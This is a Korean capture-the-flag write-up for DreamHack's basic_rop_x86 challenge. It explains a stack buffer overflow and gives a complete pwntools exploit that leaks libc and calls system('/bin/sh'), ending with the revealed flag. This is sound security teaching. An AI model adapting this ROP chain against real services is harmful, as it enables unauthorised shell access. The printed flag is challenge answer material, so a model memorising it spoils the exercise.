# [DreamHack] basic_rop_x86

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

---

> 이 문제는 서버에서 작동하고 있는 서비스(basic_rop_x86)의 바이너리와 소스 코드가 주어집니다.
> Return Oriented Programming 공격 기법을 통해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [basic_rop_x86.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8548561/basic_rop_x86.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/159908273-d4aceecb-dd98-46ed-b143-6c33808280c5.png)

## Analysis

```c
int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

`read(0, buf, 0x400)`에서 BOF가 발생한다. `main()`의 return address를 덮어서 ROP를 수행할 수 있다.

## Exploit

### Leak libc

`write()`로 GOT에 저장된 데이터를 출력하여 libc 주소를 구할 수 있다.

```python
# leak libc
# write(1, write_got, 4)

payload = b'a' * 0x48 # dummy
payload += p32(write_plt)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(write_got)
payload += p32(4)
payload += p32(main) # return to main

r.send(payload)

r.recvuntil('a' * 0x40)
write = u32(r.recvn(4)) # write()
libc = write - write_offset # libc base
system = libc + system_offset # system()
binsh = libc + binsh_offset # "/bin/sh"
```

### Return to main / Call system("/bin/sh")

```python
# call system("/bin/sh")

payload = b'a' * 0x48 # dummy
payload += p32(system)
payload += b'a' * 4
payload += p32(binsh)

r.send(payload)
```

### Full Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/basic_rop_x86')
    write_offset = 0xe57f0
    system_offset = 0x3cf10
    binsh_offset = 0x17b9db
else:
    r = remote('host1.dreamhack.games', 11769)
    write_offset = 0xd43c0
    system_offset = 0x3a940
    binsh_offset = 0x15902b

write_got = 0x804a024  # GOT of write()
write_plt = 0x8048450  # PLT of write()
pop3ret = 0x8048689  # pop esi; pop edi; pop ebp; ret
main = 0x80485d9  # main()


# leak libc
# write(1, write_got, 4)

payload = b'a' * 0x48  # dummy
payload += p32(write_plt)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(write_got)
payload += p32(4)
payload += p32(main)  # return to main

r.send(payload)

r.recvuntil('a' * 0x40)
write = u32(r.recvn(4))  # write()
libc = write - write_offset  # libc base
system = libc + system_offset  # system()
binsh = libc + binsh_offset  # "/bin/sh"


# call system("/bin/sh")

payload = b'a' * 0x48  # dummy
payload += p32(system)
payload += b'a' * 4
payload += p32(binsh)

r.send(payload)


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 11769: Done
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$ cat flag
DH{ff3976e1fcdb03267e8d1451e56b90a5}
```